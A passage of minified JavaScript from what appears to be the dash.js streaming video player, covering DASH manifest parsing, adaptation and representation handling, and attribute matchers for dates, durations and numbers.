set");ha.schemeIdUri=S[ba].schemeIdUri,S[ba].hasOwnProperty(l.default.TIMESCALE)&&(ha.timescale=S[ba].timescale),S[ba].hasOwnProperty(l.default.VALUE)&&(ha.value=S[ba].value),oa.push(ha)}return oa}function B(S){var V=[],oa=!1;return(S.BaseURL_asArray||[S.baseUri]).some((function(ba){if(ba){var ha=new J.default,ka=ba.__text||ba;return pa.isRelative(ka)&&(oa=!0,S.baseUri&&(ka=pa.resolve(ka,S.baseUri))),ha.url=ka,ba.hasOwnProperty(l.default.SERVICE_LOCATION)&&ba.serviceLocation.length?ha.serviceLocation=ba.serviceLocation:ha.serviceLocation=ka,ba.hasOwnProperty(l.default.DVB_PRIORITY)&&(ha.dvb_priority=ba[l.default.DVB_PRIORITY]),ba.hasOwnProperty(l.default.DVB_WEIGHT)&&(ha.dvb_weight=ba[l.default.DVB_WEIGHT]),ba.hasOwnProperty(l.default.AVAILABILITY_TIME_OFFSET)&&(ha.availabilityTimeOffset=ba[l.default.AVAILABILITY_TIME_OFFSET]),ba.hasOwnProperty(l.default.AVAILABILITY_TIME_COMPLETE)&&(ha.availabilityTimeComplete="false"!==ba[l.default.AVAILABILITY_TIME_COMPLETE]),V.push(ha),oa}})),V}var A,Y=void 0,Z=void 0,na=void 0,T=this.context,pa=(0,I.default)(T).getInstance(),ia=Number.isInteger||function(S){return"number"==typeof S&&isFinite(S)&&Math.floor(S)===S};return A={getIsTypeOf:F,getIsTextTrack:P,getLanguageForAdaptation:function(S){var V="";return S&&S.hasOwnProperty(l.default.LANG)&&(V=S.lang.replace(/[^A-Za-z0-9-]/g,"")),V},getViewpointForAdaptation:function(S){return S&&S.hasOwnProperty(l.default.VIEWPOINT)?S.Viewpoint:null},getRolesForAdaptation:function(S){return S&&S.hasOwnProperty(l.default.ROLE_ASARRAY)?S.Role_asArray:[]},getAccessibilityForAdaptation:function(S){return S&&S.hasOwnProperty(l.default.ACCESSIBILITY_ASARRAY)?S.Accessibility_asArray:[]},getAudioChannelConfigurationForAdaptation:function(S){return S&&S.hasOwnProperty(l.default.AUDIOCHANNELCONFIGURATION_ASARRAY)?S.AudioChannelConfiguration_asArray:[]},getAudioChannelConfigurationForRepresentation:function(S){return S&&S.hasOwnProperty(l.default.AUDIOCHANNELCONFIGURATION_ASARRAY)?S.AudioChannelConfiguration_asArray:[]},getAdaptationForIndex:function(S,V,oa){return 0<(V=Q(V,oa)).length&&ia(S)?V[S]:null},getIndexForAdaptation:function(S,V,oa){if(!S)return-1;for(V=Q(V,oa),oa=0;oa<V.length;oa++)if((0,D.default)(T).getInstance().areEqual(V[oa],S))return oa;return-1},getAdaptationForId:function(S,V,oa){V=Q(V,oa),oa=0;for(var ba=V.length;oa<ba;oa++)if(V[oa].hasOwnProperty(l.default.ID)&&V[oa].id===S)return V[oa];return null},getAdaptationsForType:function(S,V,oa){S=Q(S,V);var ba=[];V=0;for(var ha=S.length;V<ha;V++)F(S[V],oa)&&ba.push(R(S[V]));return ba},getCodec:function(S,V,oa){var ba,ha=null;return S&&S.Representation_asArray&&0<S.Representation_asArray.length&&(ba=ia(V)&&0<=V&&V<S.Representation_asArray.length?S.Representation_asArray[V]:S.Representation_asArray[0])&&(ha=ba.mimeType+';codecs="'+ba.codecs+'"',oa&&void 0!==ba.width&&(ha+=';width="'+ba.width+'";height="'+ba.height+'"')),ha&&ha.replace(/\sprofiles=[^;]*/g,"")},getMimeType:function(S){return S&&S.Representation_asArray&&0<S.Representation_asArray.length?S.Representation_asArray[0].mimeType:null},getKID:function(S){return S&&S.hasOwnProperty(l.default.CENC_DEFAULT_KID)?S[l.default.CENC_DEFAULT_KID]:null},getLabelsForAdaptation:function(S){if(!S||!Array.isArray(S.Label_asArray))return[];for(var V=[],oa=0;oa<S.Label_asArray.length;oa++)V.push({lang:S.Label_asArray[oa].lang,text:S.Label_asArray[oa].__text||S.Label_asArray[oa]});return V},getContentProtectionData:function(S){return S&&S.hasOwnProperty(l.default.CONTENTPROTECTION_ASARRAY)&&0!==S.ContentProtection_asArray.length?S.ContentProtection_asArray:null},getIsDynamic:ja,hasProfile:function(S,V){var oa=!1;return S&&S.profiles&&0<S.profiles.length&&(oa=-1!==S.profiles.indexOf(V)),oa},getDuration:function(S){return S&&S.hasOwnProperty(l.default.MEDIA_PRESENTATION_DURATION)?S.mediaPresentationDuration:S&&"dynamic"==S.type?Number.POSITIVE_INFINITY:Number.MAX_SAFE_INTEGER||Number.MAX_VALUE},getBandwidth:function(S){return S&&S.bandwidth?S.bandwidth:NaN},getManifestUpdatePeriod:function(S){var V=1>=arguments.length||void 0===arguments[1]?0:arguments[1],oa=NaN;return S&&S.hasOwnProperty(l.default.MINIMUM_UPDATE_PERIOD)&&(oa=S.minimumUpdatePeriod),isNaN(oa)?oa:Math.max(oa-V,1)},getRepresentationCount:function(S){return S&&Array.isArray(S.Representation_asArray)?S.Representation_asArray.length:0},getBitrateListForAdaptation:function(S){return((S=R(S))&&Array.isArray(S.Representation_asArray)?S.Representation_asArray:[]).map((function(V){return{bandwidth:V.bandwidth,width:V.width||0,height:V.height||0,scanType:V.scanType||null,id:V.id||null}}))},getRepresentationFor:function(S,V){return V&&V.Representation_asArray&&0<V.Representation_asArray.length&&ia(S)?V.Representation_asArray[S]:null},getRepresentationsForAdaptation:function(S){var V,oa,ba,ha,ka,la,C=[],fa=aa(S),qa=void 0,va=void 0;if(fa&&fa.Representation_asArray){S&&S.period&&ia(S.period.index)&&(V=B(S.period.mpd.manifest))&&(va=V[0]),V=0;for(var xa=fa.Representation_asArray.length;V<xa;++V){var za,Ca=fa.Representation_asArray[V],Ba=new f.default;Ba.index=V,Ba.adaptation=S,Ca.hasOwnProperty(l.default.ID)&&(Ba.id=Ca.id),Ca.hasOwnProperty(l.default.CODECS)&&(Ba.codecs=Ca.codecs),Ca.hasOwnProperty(l.default.CODEC_PRIVATE_DATA)&&(Ba.codecPrivateData=Ca.codecPrivateData),Ca.hasOwnProperty(l.default.BANDWITH)&&(Ba.bandwidth=Ca.bandwidth),Ca.hasOwnProperty(l.default.WIDTH)&&(Ba.width=Ca.width),Ca.hasOwnProperty(l.default.HEIGHT)&&(Ba.height=Ca.height),Ca.hasOwnProperty(l.default.SCAN_TYPE)&&(Ba.scanType=Ca.scanType),Ca.hasOwnProperty(l.default.MAX_PLAYOUT_RATE)&&(Ba.maxPlayoutRate=Ca.maxPlayoutRate),Ca.hasOwnProperty(l.default.SEGMENT_BASE)?(qa=Ca.SegmentBase,Ba.segmentInfoType=l.default.SEGMENT_BASE):Ca.hasOwnProperty(l.default.SEGMENT_LIST)?(qa=Ca.SegmentList).hasOwnProperty(l.default.SEGMENT_TIMELINE)?(Ba.segmentInfoType=l.default.SEGMENT_TIMELINE,Ba.useCalculatedLiveEdgeTime=ma(qa.SegmentTimeline)):(Ba.segmentInfoType=l.default.SEGMENT_LIST,Ba.useCalculatedLiveEdgeTime=!0):Ca.hasOwnProperty(l.default.SEGMENT_TEMPLATE)?((qa=Ca.SegmentTemplate).hasOwnProperty(l.default.SEGMENT_TIMELINE)?(Ba.segmentInfoType=l.default.SEGMENT_TIMELINE,Ba.useCalculatedLiveEdgeTime=ma(qa.SegmentTimeline)):Ba.segmentInfoType=l.default.SEGMENT_TEMPLATE,qa.hasOwnProperty(l.default.INITIALIZATION_MINUS)&&(Ba.initialization=qa.initialization.split("$Bandwidth$").join(Ca.bandwidth).split("$RepresentationID$").join(Ca.id))):Ba.segmentInfoType=l.default.BASE_URL,Ba.essentialProperties=W(Ca),qa&&(qa.hasOwnProperty(l.default.INITIALIZATION)?((za=qa.Initialization).hasOwnProperty(l.default.SOURCE_URL)&&(Ba.initialization=za.sourceURL),za.hasOwnProperty(l.default.RANGE)&&(Ba.range=za.range)):Ca.hasOwnProperty(l.default.MIME_TYPE)&&P(Ca.mimeType)&&(Ba.range=0),qa.hasOwnProperty(l.default.TIMESCALE)&&(Ba.timescale=qa.timescale),qa.hasOwnProperty(l.default.DURATION)?Ba.segmentDuration=qa.duration/Ba.timescale:Ca.hasOwnProperty(l.default.SEGMENT_TEMPLATE)&&(qa=Ca.SegmentTemplate).hasOwnProperty(l.default.SEGMENT_TIMELINE)&&(Ba.segmentDuration=(ka=void 0,ka=(ha=qa.SegmentTimeline).S_asArray[0],la=ha.S_asArray[1],(ka.hasOwnProperty("d")?ka.d:la.t-ka.t)/Ba.timescale)),qa.hasOwnProperty(l.default.MEDIA)&&(Ba.media=qa.media),qa.hasOwnProperty(l.default.START_NUMBER)&&(Ba.startNumber=qa.startNumber),qa.hasOwnProperty(l.default.INDEX_RANGE)&&(Ba.indexRange=qa.indexRange),qa.hasOwnProperty(l.default.PRESENTATION_TIME_OFFSET)&&(Ba.presentationTimeOffset=qa.presentationTimeOffset/Ba.timescale),qa.hasOwnProperty(l.default.AVAILABILITY_TIME_OFFSET)?Ba.availabilityTimeOffset=qa.availabilityTimeOffset:va&&void 0!==va.availabilityTimeOffset&&(Ba.availabilityTimeOffset=va.availabilityTimeOffset),qa.hasOwnProperty(l.default.AVAILABILITY_TIME_COMPLETE)?Ba.availabilityTimeComplete="false"!==qa.availabilityTimeComplete:va&&void 0!==va.availabilityTimeComplete&&(Ba.availabilityTimeComplete=va.availabilityTimeComplete)),Ba.MSETimeOffset=(ba=(oa=Ba).presentationTimeOffset,oa.adaptation.period.start-ba),Ba.path=[S.period.index,S.index,V],C.push(Ba)}}return C},getAdaptationsForPeriod:function(S){var ba,V=S&&ia(S.index)?S.mpd.manifest.Period_asArray[S.index]:null,oa=[];if(V&&V.AdaptationSet_asArray)for(ba=0;ba<V.AdaptationSet_asArray.length;ba++){var ha=V.AdaptationSet_asArray[ba],ka=new g.default;ha.hasOwnProperty(l.default.ID)&&(ka.id=ha.id),ka.index=ba,ka.period=S,F(ha,p.default.MUXED)?ka.type=p.default.MUXED:F(ha,p.default.AUDIO)?ka.type=p.default.AUDIO:F(ha,p.default.VIDEO)?ka.type=p.default.VIDEO:F(ha,p.default.FRAGMENTED_TEXT)?ka.type=p.default.FRAGMENTED_TEXT:F(ha,p.default.IMAGE)?ka.type=p.default.IMAGE:ka.type=p.default.TEXT,oa.push(ka)}return oa},getRegularPeriods:function(S){var V=!!S&&ja(S.manifest),oa=[],ba=null,ha=null,ka=null,la=null,C=void 0;C=0;for(var fa=S&&S.manifest&&S.manifest.Period_asArray?S.manifest.Period_asArray.length:0;C<fa;C++)(ha=S.manifest.Period_asArray[C]).hasOwnProperty(l.default.START)?(la=new t.default).start=ha.start:null!==ba&&ba.hasOwnProperty(l.default.DURATION)&&null!==ka?(la=new t.default).start=parseFloat((ka.start+ka.duration).toFixed(5)):0!==C||V||((la=new t.default).start=0),null!==ka&&isNaN(ka.duration)&&(null!==la?ka.duration=parseFloat((la.start-ka.start).toFixed(5)):Y.warn("First period duration could not be calculated because lack of start and duration period properties. This will cause timing issues during playback")),null!==la&&(la.id=function(qa,va){if(!qa)throw Error("Period cannot be null or undefined");return va=t.default.DEFAULT_ID+"_"+va,qa.hasOwnProperty(l.default.ID)&&0<qa.id.length&&"__proto__"!==qa.id&&(va=qa.id),va}(ha,C),la.index=C,la.mpd=S,ha.hasOwnProperty(l.default.DURATION)&&(la.duration=ha.duration),oa.push(la),ba=ha,ka=la),la=ha=null;return 0===oa.length||null!==ka&&isNaN(ka.duration)&&(ka.duration=parseFloat((function(qa){if(!Z||!Z.hasOwnProperty("error"))throw Error(p.default.MISSING_CONFIG_ERROR);var va=ja(qa.mpd.manifest),xa=void 0;return qa.mpd.manifest.mediaPresentationDuration?xa=qa.mpd.manifest.mediaPresentationDuration:qa.duration?xa=qa.duration:va?xa=Number.POSITIVE_INFINITY:Z.error(new N.default(w.default.MANIFEST_ERROR_ID_PARSE_CODE,"Must have @mediaPresentationDuration on MPD or an explicit @duration on the last period.",qa)),xa}(ka)-ka.start).toFixed(5))),oa},getMpd:function(S){var V=new r.default;return S&&((V.manifest=S).hasOwnProperty(l.default.AVAILABILITY_START_TIME)?V.availabilityStartTime=new Date(S.availabilityStartTime.getTime()):S.loadedTime&&(V.availabilityStartTime=new Date(S.loadedTime.getTime())),S.hasOwnProperty(l.default.AVAILABILITY_END_TIME)&&(V.availabilityEndTime=new Date(S.availabilityEndTime.getTime())),S.hasOwnProperty(l.default.MINIMUM_UPDATE_PERIOD)&&(V.minimumUpdatePeriod=S.minimumUpdatePeriod),S.hasOwnProperty(l.default.MEDIA_PRESENTATION_DURATION)&&(V.mediaPresentationDuration=S.mediaPresentationDuration),S.hasOwnProperty(l.default.SUGGESTED_PRESENTATION_DELAY)&&(V.suggestedPresentationDelay=S.suggestedPresentationDelay),S.hasOwnProperty(l.default.TIMESHIFT_BUFFER_DEPTH)&&(V.timeShiftBufferDepth=S.timeShiftBufferDepth),S.hasOwnProperty(l.default.MAX_SEGMENT_DURATION)&&(V.maxSegmentDuration=S.maxSegmentDuration)),V},getEventsForPeriod:function(S){var ba,ha,V=S&&S.mpd&&S.mpd.manifest?S.mpd.manifest:null,oa=[];if(V=(V=V?V.Period_asArray:null)&&S&&ia(S.index)?V[S.index].EventStream_asArray:null)for(ba=0;ba<V.length;ba++){var ka=new E.default;if(ka.period=S,ka.timescale=1,!V[ba].hasOwnProperty(p.default.SCHEME_ID_URI))throw Error("Invalid EventStream. SchemeIdUri has to be set");for(ka.schemeIdUri=V[ba].schemeIdUri,V[ba].hasOwnProperty(l.default.TIMESCALE)&&(ka.timescale=V[ba].timescale),V[ba].hasOwnProperty(l.default.VALUE)&&(ka.value=V[ba].value),ha=0;V[ba].Event_asArray&&ha<V[ba].Event_asArray.length;ha++){var la,C=new z.default;C.presentationTime=0,C.eventStream=ka,V[ba].Event_asArray[ha].hasOwnProperty(l.default.PRESENTATION_TIME)&&(C.presentationTime=V[ba].Event_asArray[ha].presentationTime,la=ka.presentationTimeOffset?ka.presentationTimeOffset*ka.timescale:0,C.calculatedPresentationTime=C.presentationTime+S.start*ka.timescale+la),V[ba].Event_asArray[ha].hasOwnProperty(l.default.DURATION)&&(C.duration=V[ba].Event_asArray[ha].duration),V[ba].Event_asArray[ha].hasOwnProperty(l.default.ID)&&(C.id=V[ba].Event_asArray[ha].id),V[ba].Event_asArray[ha].Signal&&V[ba].Event_asArray[ha].Signal.Binary?C.messageData=na.decodeArray(V[ba].Event_asArray[ha].Signal.Binary.toString()):C.messageData=V[ba].Event_asArray[ha].messageData||V[ba].Event_asArray[ha].__text,oa.push(C)}}return oa},getEventStreamForAdaptationSet:function(S,V){var oa=void 0,ba=void 0,ha=void 0;return S&&S.Period_asArray&&V&&V.period&&ia(V.period.index)&&(ba=S.Period_asArray[V.period.index])&&ba.AdaptationSet_asArray&&ia(V.index)&&(ha=ba.AdaptationSet_asArray[V.index])&&(oa=ha.InbandEventStream_asArray),H(oa,null)},getEventStreamForRepresentation:function(S,V){var oa=void 0,ba=void 0,ha=void 0,ka=void 0;return S&&S.Period_asArray&&V&&V.adaptation&&V.adaptation.period&&ia(V.adaptation.period.index)&&(ba=S.Period_asArray[V.adaptation.period.index])&&ba.AdaptationSet_asArray&&ia(V.adaptation.index)&&(ha=ba.AdaptationSet_asArray[V.adaptation.index])&&ha.Representation_asArray&&ia(V.index)&&(ka=ha.Representation_asArray[V.index])&&(oa=ka.InbandEventStream_asArray),H(oa,V)},getUTCTimingSources:function(S){var V=ja(S),oa=!!S&&S.hasOwnProperty(l.default.AVAILABILITY_START_TIME);S=S?S.UTCTiming_asArray:null;var ba=[];return(V||oa)&&S&&S.forEach((function(ha){var ka=new x.default;ha.hasOwnProperty(p.default.SCHEME_ID_URI)&&(ka.schemeIdUri=ha.schemeIdUri,ha.hasOwnProperty(l.default.VALUE)&&(ka.value=ha.value.toString(),ba.push(ka)))})),ba},getBaseURLsFromElement:B,getRepresentationSortFunction:O,getLocation:function(S){if(S&&S.hasOwnProperty(p.default.LOCATION))return S.Location=S.Location_asArray[0],S.Location},getUseCalculatedLiveEdgeTimeForAdaptation:function(S){var V=void 0;if(S=(S=aa(S))&&Array.isArray(S.Representation_asArray)?S.Representation_asArray[0]:null){if(S.hasOwnProperty(l.default.SEGMENT_LIST))return!(V=S.SegmentList).hasOwnProperty(l.default.SEGMENT_TIMELINE)||ma(V.SegmentTimeline);if(S.hasOwnProperty(l.default.SEGMENT_TEMPLATE)&&(V=S.SegmentTemplate).hasOwnProperty(l.default.SEGMENT_TIMELINE))return ma(V.SegmentTimeline)}return!1},getSuggestedPresentationDelay:function(S){return S&&S.hasOwnProperty(l.default.SUGGESTED_PRESENTATION_DELAY)?S.suggestedPresentationDelay:null},getAvailabilityStartTime:function(S){return S&&S.hasOwnProperty(l.default.AVAILABILITY_START_TIME)&&null!==S.availabilityStartTime?S.availabilityStartTime.getTime():null},getServiceDescriptions:function(S){var V=[];if(S&&S.hasOwnProperty(l.default.SERVICE_DESCRIPTION)){var oa=!0,ba=!1,ha=void 0;try{for(var ka,la=S.ServiceDescription_asArray[Symbol.iterator]();!(oa=(ka=la.next()).done);oa=!0){var xa,C=ka.value,fa=S=void 0,qa=void 0,va=void 0;for(xa in C)C.hasOwnProperty(xa)&&(xa===l.default.ID?S=C[xa]:xa===l.default.SERVICE_DESCRIPTION_SCOPE?fa=C[xa].schemeIdUri:xa===l.default.SERVICE_DESCRIPTION_LATENCY?qa={target:C[xa].target,max:C[xa].max,min:C[xa].min}:xa===l.default.SERVICE_DESCRIPTION_PLAYBACK_RATE&&(va={max:C[xa].max,min:C[xa].min}));fa===p.default.SERVICE_DESCRIPTION_LL_SCHEME&&(qa||va)&&V.push({id:S,schemeIdUri:fa,latency:qa,playbackRate:va})}}catch(za){ba=!0,ha=za}finally{try{!oa&&la.return&&la.return()}finally{if(ba)throw ha}}}return V},getSupplementalPropperties:function(S){var V={};if(S&&S.hasOwnProperty(l.default.SUPPLEMENTAL_PROPERTY)){var oa=!0,ba=!1,ha=void 0;try{for(var ka,la=S.SupplementalProperty_asArray[Symbol.iterator]();!(oa=(ka=la.next()).done);oa=!0){var C=ka.value;C.hasOwnProperty(p.default.SCHEME_ID_URI)&&C.hasOwnProperty(l.default.VALUE)&&(V[C[p.default.SCHEME_ID_URI]]=C[l.default.VALUE])}}catch(fa){ba=!0,ha=fa}finally{try{!oa&&la.return&&la.return()}finally{if(ba)throw ha}}}return V},setConfig:function(S){S&&(S.errHandler&&(Z=S.errHandler),S.BASE64&&(na=S.BASE64))}},Y=(0,G.default)(T).getInstance().getLogger(A),A}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(108)),l=v(u(61)),f=v(u(92)),g=v(u(84)),t=v(u(91)),r=v(u(90)),x=v(u(96)),z=v(u(86)),J=v(u(85)),E=v(u(87)),D=v(u(216)),I=v(u(220)),L=v(u(47)),G=v(u(45)),N=v(u(225)),w=v(u(51)),h=u(204);m.__dashjs_factory_name="DashManifestModel",M.default=L.default.getSingletonFactory(m),da.exports=M.default},{108:108,204:204,216:216,220:220,225:225,45:45,47:47,51:51,61:61,84:84,85:85,86:86,87:87,90:90,91:91,92:92,96:96}],66:[function(u,da,M){function v(E){return E&&E.__esModule?E:{default:E}}function m(E){E=E||{};var D=this.context;E=E.debug;var I,L=void 0,G=void 0,N=void 0,w=void 0;return I={parse:function(h){var F=wa.performance.now();if(!(h=N.xml_str2json(h)))throw Error("parsing the manifest failed");var P=wa.performance.now();w.run(h);var O=wa.performance.now();return L.info("Parsing complete: ( xml2json: "+(P-F).toPrecision(3)+"ms, objectiron: "+(O-P).toPrecision(3)+"ms, total: "+((O-F)/1e3).toPrecision(3)+"s)"),h.protocol="DASH",h},getMatchers:function(){return G},getIron:function(){return w}},L=E.getLogger(I),G=[new t.default,new r.default,new x.default,new g.default],N=new f.default({escapeMode:!1,attributePrefix:"",arrayAccessForm:"property",emptyNodeForm:"object",stripWhitespaces:!1,enableToStringFunc:!0,ignoreRoot:!0,matchers:G}),w=(0,l.default)(D).create({adaptationset:new z.default,period:new J.default}),I}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(47)),l=v(u(76)),f=v(u(3)),g=v(u(75)),t=v(u(73)),r=v(u(72)),x=v(u(74)),z=v(u(69)),J=v(u(70));m.__dashjs_factory_name="DashParser",M.default=p.default.getClassFactory(m),da.exports=M.default},{3:3,47:47,69:69,70:70,72:72,73:73,74:74,75:75,76:76}],67:[function(u,da,M){function v(p,l){for(var f=0;f<l.length;f++){var g=l[f];g.enumerable=g.enumerable||!1,g.configurable=!0,"value"in g&&(g.writable=!0),Object.defineProperty(p,g.key,g)}}function m(p){if(!(this instanceof m))throw new TypeError("Cannot call a class as a function");this._merge=(this._name=p)&&p.length&&p.charAt(0)===p.charAt(0).toUpperCase()}var p,l;Object.defineProperty(M,"__esModule",{value:!0}),p=m,(l=[{key:"name",get:function(){return this._name}},{key:"merge",get:function(){return this._merge}}])&&v(p.prototype,l),u=m,M.default=u,da.exports=M.default},{}],68:[function(u,da,M){function v(f,g){for(var t=0;t<g.length;t++){var r=g[t];r.enumerable=r.enumerable||!1,r.configurable=!0,"value"in r&&(r.writable=!0),Object.defineProperty(f,r.key,r)}}function m(f,g,t){var r=this;if(!(this instanceof m))throw new TypeError("Cannot call a class as a function");this._name=f||"",this._properties=[],this._children=t||[],Array.isArray(g)&&g.forEach((function(x){r._properties.push(new l.default(x))}))}Object.defineProperty(M,"__esModule",{value:!0});var p,f,g,l=(p=u(67))&&p.__esModule?p:{default:p};f=m,(g=[{key:"name",get:function(){return this._name}},{key:"children",get:function(){return this._children}},{key:"properties",get:function(){return this._properties}}])&&v(f.prototype,g),u=m,M.default=u,da.exports=M.default},{67:67}],69:[function(u,da,M){function v(f){return f&&f.__esModule?f:{default:f}}function m(){if(!(this instanceof m))throw new TypeError("Cannot call a class as a function");var f=[l.default.PROFILES,l.default.WIDTH,l.default.HEIGHT,l.default.SAR,l.default.FRAMERATE,l.default.AUDIO_SAMPLING_RATE,l.default.MIME_TYPE,l.default.SEGMENT_PROFILES,l.default.CODECS,l.default.MAXIMUM_SAP_PERIOD,l.default.START_WITH_SAP,l.default.MAX_PLAYOUT_RATE,l.default.CODING_DEPENDENCY,l.default.SCAN_TYPE,l.default.FRAME_PACKING,l.default.AUDIO_CHANNEL_CONFIGURATION,l.default.CONTENT_PROTECTION,l.default.ESSENTIAL_PROPERTY,l.default.SUPPLEMENTAL_PROPERTY,l.default.INBAND_EVENT_STREAM];a:{for(var g=Object.getPrototypeOf(m.prototype),t="constructor",r=this,x=!0;x;){if(null===g&&(g=Function.prototype),void 0!==(x=Object.getOwnPropertyDescriptor(g,t))){if("value"in x){r=x.value;break a}if(void 0===(t=x.get))break;r=t.call(r);break a}if(null===(g=Object.getPrototypeOf(g)))break;x=!0}r=void 0}r.call(this,l.default.ADAPTATION_SET,f,[new p.default(l.default.REPRESENTATION,f,[new p.default(l.default.SUB_REPRESENTATION,f)])])}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(68)),l=v(u(61));(function(f,g){if("function"!=typeof g&&null!==g)throw new TypeError("Super expression must either be null or a function, not "+typeof g);f.prototype=Object.create(g&&g.prototype,{constructor:{value:f,enumerable:!1,writable:!0,configurable:!0}}),g&&(Object.setPrototypeOf?Object.setPrototypeOf(f,g):f.__proto__=g)})(m,p.default),u=m,M.default=u,da.exports=M.default},{61:61,68:68}],70:[function(u,da,M){function v(f){return f&&f.__esModule?f:{default:f}}function m(){if(!(this instanceof m))throw new TypeError("Cannot call a class as a function");var f=[l.default.SEGMENT_BASE,l.default.SEGMENT_TEMPLATE,l.default.SEGMENT_LIST];a:{for(var g=Object.getPrototypeOf(m.prototype),t="constructor",r=this,x=!0;x;){if(null===g&&(g=Function.prototype),void 0!==(x=Object.getOwnPropertyDescriptor(g,t))){if("value"in x){r=x.value;break a}if(void 0===(t=x.get))break;r=t.call(r);break a}if(null===(g=Object.getPrototypeOf(g)))break;x=!0}r=void 0}r.call(this,l.default.PERIOD,f,[new p.default(l.default.ADAPTATION_SET,f,[new p.default(l.default.REPRESENTATION,f)])])}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(68)),l=v(u(61));(function(f,g){if("function"!=typeof g&&null!==g)throw new TypeError("Super expression must either be null or a function, not "+typeof g);f.prototype=Object.create(g&&g.prototype,{constructor:{value:f,enumerable:!1,writable:!0,configurable:!0}}),g&&(Object.setPrototypeOf?Object.setPrototypeOf(f,g):f.__proto__=g)})(m,p.default),u=m,M.default=u,da.exports=M.default},{61:61,68:68}],71:[function(u,da,M){function v(p,l){for(var f=0;f<l.length;f++){var g=l[f];g.enumerable=g.enumerable||!1,g.configurable=!0,"value"in g&&(g.writable=!0),Object.defineProperty(p,g.key,g)}}function m(p,l){if(!(this instanceof m))throw new TypeError("Cannot call a class as a function");this._test=p,this._converter=l}var p,l;Object.defineProperty(M,"__esModule",{value:!0}),p=m,(l=[{key:"test",get:function(){return this._test}},{key:"converter",get:function(){return this._converter}}])&&v(p.prototype,l),u=m,M.default=u,da.exports=M.default},{}],72:[function(u,da,M){function v(){if(!(this instanceof v))throw new TypeError("Cannot call a class as a function");m(Object.getPrototypeOf(v.prototype),"constructor",this).call(this,(function(f){return l.test(f.value)}),(function(f){var g;f=l.exec(f);var t=Date.UTC(parseInt(f[1],10),parseInt(f[2],10)-1,parseInt(f[3],10),parseInt(f[4],10),parseInt(f[5],10),f[6]&&parseInt(f[6],10)||0,f[7]&&1e3*parseFloat(f[7])||0);return f[9]&&f[10]&&(g=60*parseInt(f[9],10)+parseInt(f[10],10),t+=("+"===f[8]?-1:1)*g*6e4),new Date(t)}))}Object.defineProperty(M,"__esModule",{value:!0});var p,m=function(f,g,t){for(var r=!0;r;){if(null===f&&(f=Function.prototype),void 0!==(r=Object.getOwnPropertyDescriptor(f,g))){if("value"in r)return r.value;if(void 0===(g=r.get))break;return g.call(t)}if(null===(f=Object.getPrototypeOf(f)))break;r=!0}};u=(p=u(71))&&p.__esModule?p:{default:p};var l=/^([0-9]{4})-([0-9]{2})-([0-9]{2})T([0-9]{2}):([0-9]{2})(?::([0-9]*)(\.[0-9]*)?)?(?:([+-])([0-9]{2})(?::?)([0-9]{2}))?/;(function(f,g){if("function"!=typeof g&&null!==g)throw new TypeError("Super expression must either be null or a function, not "+typeof g);f.prototype=Object.create(g&&g.prototype,{constructor:{value:f,enumerable:!1,writable:!0,configurable:!0}}),g&&(Object.setPrototypeOf?Object.setPrototypeOf(f,g):f.__proto__=g)})(v,u.default),p=v,M.default=p,da.exports=M.default},{71:71}],73:[function(u,da,M){function v(r){return r&&r.__esModule?r:{default:r}}function m(){if(!(this instanceof m))throw new TypeError("Cannot call a class as a function");p(Object.getPrototypeOf(m.prototype),"constructor",this).call(this,(function(r){for(var x=[g.default.MIN_BUFFER_TIME,g.default.MEDIA_PRESENTATION_DURATION,g.default.MINIMUM_UPDATE_PERIOD,g.default.TIMESHIFT_BUFFER_DEPTH,g.default.MAX_SEGMENT_DURATION,g.default.MAX_SUBSEGMENT_DURATION,g.default.SUGGESTED_PRESENTATION_DELAY,g.default.START,f.default.START_TIME,g.default.DURATION],z=x.length,J=0;J<z;J++)if(r.nodeName===x[J])return t.test(r.value);return!1}),(function(r){r=t.exec(r);var x=31536e3*parseFloat(r[3]||0)+2592e3*parseFloat(r[5]||0)+86400*parseFloat(r[7]||0)+3600*parseFloat(r[9]||0)+60*parseFloat(r[11]||0)+parseFloat(r[13]||0);return void 0!==r[1]&&(x=-x),x}))}Object.defineProperty(M,"__esModule",{value:!0});var p=function(r,x,z){for(var J=!0;J;){if(null===r&&(r=Function.prototype),void 0!==(J=Object.getOwnPropertyDescriptor(r,x))){if("value"in J)return J.value;if(void 0===(x=J.get))break;return x.call(z)}if(null===(r=Object.getPrototypeOf(r)))break;J=!0}},l=v(u(71)),f=v(u(108)),g=v(u(61)),t=/^([-])?P(([\d.]*)Y)?(([\d.]*)M)?(([\d.]*)D)?T?(([\d.]*)H)?(([\d.]*)M)?(([\d.]*)S)?/;(function(r,x){if("function"!=typeof x&&null!==x)throw new TypeError("Super expression must either be null or a function, not "+typeof x);r.prototype=Object.create(x&&x.prototype,{constructor:{value:r,enumerable:!1,writable:!0,configurable:!0}}),x&&(Object.setPrototypeOf?Object.setPrototypeOf(r,x):r.__proto__=x)})(m,l.default),u=m,M.default=u,da.exports=M.default},{108:108,61:61,71:71}],74:[function(u,da,M){function v(){if(!(this instanceof v))throw new TypeError("Cannot call a class as a function");m(Object.getPrototypeOf(v.prototype),"constructor",this).call(this,(function(f){return l.test(f.value)}),(function(f){return parseFloat(f)}))}Object.defineProperty(M,"__esModule",{value:!0});var p,m=function(f,g,t){for(var r=!0;r;){if(null===f&&(f=Function.prototype),void 0!==(r=Object.getOwnPropertyDescriptor(f,g))){if("value"in r)return r.value;if(void 0===(g=r.get))break;return g.call(t)}if(null===(f=Object.getPrototypeOf(f)))break;r=!0}};u=(p=u(71))&&p.__esModule?p:{default:p};var l=/^[-+]?[0-9]+[.]?[0-9]*([eE][-+]?[0-9]+)?$/;(function(f,g){if("function"!=typeof g&&null!==g)throw new TypeError("Super expression must either be null or a function, not "+typeof g);f.prototype=Object.create(g&&g.prototype,{constructor:{value:f,enumerable:!1,writable:!0,configurable:!0}}),g&&(Object.setPrototypeOf?Object.setPrototypeOf(f,g):f.__proto__=g)})(v,u.default),p=v,M.default=p,da.exports=M.default},{71:71}],75:[function(u,da,M){function v(t){return t&&t.__esModule?t:{default:t}}function m(t,r,x){return r in t?Object.defineProperty(t,r,{value:x,enumerable:!0,configurable:!0,writable:!0}):t[r]=x,t}function p(){if(!(this instanceof p))throw new TypeError("Cannot call a class as a function");l(Object.getPrototypeOf(p.prototype),"constructor",this).call(this,(function(t,r){var 